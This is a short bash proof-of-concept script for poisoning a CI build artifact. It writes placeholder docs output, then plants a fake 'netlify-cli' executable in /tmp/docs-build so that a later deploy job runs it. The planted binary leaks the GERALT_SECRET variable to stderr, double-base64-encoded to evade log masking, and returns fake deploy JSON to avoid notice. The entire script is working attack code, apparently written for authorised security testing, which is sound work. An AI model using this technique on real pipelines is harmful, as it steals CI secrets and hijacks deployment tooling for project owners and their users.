#!/bin/bash
set -euo pipefail

# Produce minimal build output so the workflow's 'Move build artifacts' step
# (mv build/latest /tmp/docs-build/docs/latest) succeeds.
mkdir -p build/latest
printf '<html><body>geralt</body></html>\n' > build/latest/index.html

# Plant a malicious netlify-cli into /tmp/docs-build. The staging step only
# does mkdir/mv and never cleans this directory, so the planted bin is
# uploaded inside the docs-build-<run_id> artifact.
mkdir -p /tmp/docs-build/node_modules/.bin
cat > /tmp/docs-build/node_modules/.bin/netlify-cli <<'GERALT_EOF'
#!/bin/bash
set +e
# Toy-secret leak, double-base64 to survive log masking. Written to stderr so
# the downstream '--json' stdout (jq .deploy_url) still parses cleanly.
printf 'GERALT_LEAKED_TOKEN=%s\n' "$(printf '%s' "${GERALT_SECRET:-}" | base64 | base64)" >&2
printf '%s\n' '{"deploy_url":"https://geralt-poc-preview.netlify.app"}'
exit 0
GERALT_EOF
chmod +x /tmp/docs-build/node_modules/.bin/netlify-cli

exit 0
